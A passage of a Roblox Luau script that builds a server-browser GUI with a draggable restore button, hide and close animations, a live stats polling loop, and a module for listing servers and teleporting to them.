	Name = "RestoreButton", Parent = Gui,
	AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -14, 0, 14),
	Size = UDim2.fromOffset(56, 46),
	BackgroundColor3 = C.accent, BackgroundTransparency = 0.1, BorderSizePixel = 0,
	Text = "UI", TextColor3 = C.white, Font = Enum.Font.GothamBold, TextScaled = true,
	AutoButtonColor = false, Visible = false,
})
corner(RestoreBtn, 0.3)
do
	local img, rs, ro, parts
	for _, nm in ipairs({ "database-search", "server", "database" }) do
		img, rs, ro, parts = lucideIcon(nm)
		if img then break end
	end
	if img then
		RestoreBtn.Text = ""
		local ic = make("ImageLabel", {
			Name = "RestoreIcon", Parent = RestoreBtn, AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(26, 26), BackgroundTransparency = 1,
			Image = img, ImageRectSize = rs, ImageRectOffset = ro, ImageColor3 = C.white,
		})
		for _, pn in ipairs(parts or {}) do
			local pi, ps, po = lucideIcon(pn)
			if pi then
				make("ImageLabel", {
					Parent = ic, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
					Image = pi, ImageRectSize = ps, ImageRectOffset = po, ImageColor3 = C.white,
				})
			end
		end
	else
		RestoreBtn.Text = "UI"
	end
end
stroke(RestoreBtn, 0.4)
padPx(RestoreBtn, 4, 4)
RestoreBtn.MouseEnter:Connect(function() tween(RestoreBtn, 0.12, { BackgroundTransparency = 0 }) end)
RestoreBtn.MouseLeave:Connect(function() tween(RestoreBtn, 0.12, { BackgroundTransparency = 0.1 }) end)

local RestoreScale = make("UIScale", { Name = "RestoreScale", Parent = RestoreBtn, Scale = 0 })
local hideToken = 0
local function setHidden(hidden)
	hideToken += 1
	local my = hideToken
	if hidden then
		local tw = TweenService:Create(MainScale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0.85 })
		tw.Completed:Connect(function() if my == hideToken then Main.Visible = false end end)
		tw:Play()
		RestoreBtn.Visible = true
		RestoreScale.Scale = 0
		tween(RestoreScale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back, 0.1)
	else
		Main.Visible = true
		MainScale.Scale = 0.85
		tween(MainScale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back)
		local tw = TweenService:Create(RestoreScale, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0 })
		tw.Completed:Connect(function() if my == hideToken then RestoreBtn.Visible = false end end)
		tw:Play()
	end
end

local restoreDrag = { active = false, moved = false, start = nil, startPos = nil, touch = nil }

connect(RestoreBtn.InputBegan, function(input)
	if input.UserInputState ~= Enum.UserInputState.Begin then return end
	if input.UserInputType ~= Enum.UserInputType.MouseButton1
		and input.UserInputType ~= Enum.UserInputType.Touch then return end
	restoreDrag.active = true
	restoreDrag.moved = false
	restoreDrag.start = input.Position
	restoreDrag.startPos = RestoreBtn.Position
	restoreDrag.touch = input.UserInputType == Enum.UserInputType.Touch and input or nil
end)

connect(UserInputService.InputChanged, function(input)
	if not restoreDrag.active then return end
	if input.UserInputType ~= Enum.UserInputType.MouseMovement
		and input ~= restoreDrag.touch then return end
	local delta = input.Position - restoreDrag.start
	if math.abs(delta.X) + math.abs(delta.Y) > 4 then
		restoreDrag.moved = true
	end
	RestoreBtn.Position = UDim2.new(
		restoreDrag.startPos.X.Scale, restoreDrag.startPos.X.Offset + delta.X,
		restoreDrag.startPos.Y.Scale, restoreDrag.startPos.Y.Offset + delta.Y
	)
end)

connect(UserInputService.InputEnded, function(input)
	if not restoreDrag.active then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or (input.UserInputType == Enum.UserInputType.Touch and input == restoreDrag.touch) then
		restoreDrag.active = false
		restoreDrag.start = nil
		restoreDrag.startPos = nil
		restoreDrag.touch = nil
	end
end)

RestoreBtn.MouseButton1Click:Connect(function()
	if restoreDrag.moved then
		restoreDrag.moved = false
		return
	end
	setHidden(false)
end)

HideBtn.MouseButton1Click:Connect(function() setHidden(true) end)

local closing = false
Close.MouseButton1Click:Connect(function()
	if closing then return end
	closing = true
	state.alive = false
	for _, c in ipairs(conns) do c:Disconnect() end
	local tw = TweenService:Create(MainScale, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), { Scale = 0 })
	tw.Completed:Connect(function() Gui:Destroy() end)
	tw:Play()
end)

task.spawn(function()
	local lastOk = os.clock()
	while state.alive do
		local u, pid = state.universe, state.placeId
		if u then
			local g, v = fetchStats(u)
			if u == state.universe then
				applyStats(g, v, pid)
				if g then lastOk = os.clock() end
			end
		end
		for _ = 1, 5 do
			if not state.alive then return end
			LiveText.Text = ("LIVE  -  updated %ds ago"):format(math.floor(os.clock() - lastOk))
			task.wait(1)
		end
	end
end)

loadDiskCache()

tween(MainScale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back)
setIcon(game.GameId)
loadPlaces()
switchPlace(game.PlaceId, true)

local module = {}

function module:Teleport(placeId, playerCount)
	if playerCount then
		hop(placeId, playerCount)
	else
		return randomTeleport(placeId)
	end
end

function module:GetServers(placeId)
	local out = {}
	local _, err = eachPage(tonumber(placeId) or game.PlaceId, MAX_PAGES,
		function() return false end, function(page)
			for _, s in ipairs(page) do
				table.insert(out, { id = s.id, playing = s.playing, maxPlayers = s.maxPlayers })
			end
		end, "Desc")
	return out, err
end

function module:JoinServerById(placeId, serverId)
	return teleportTo(placeId, serverId)
end

return module
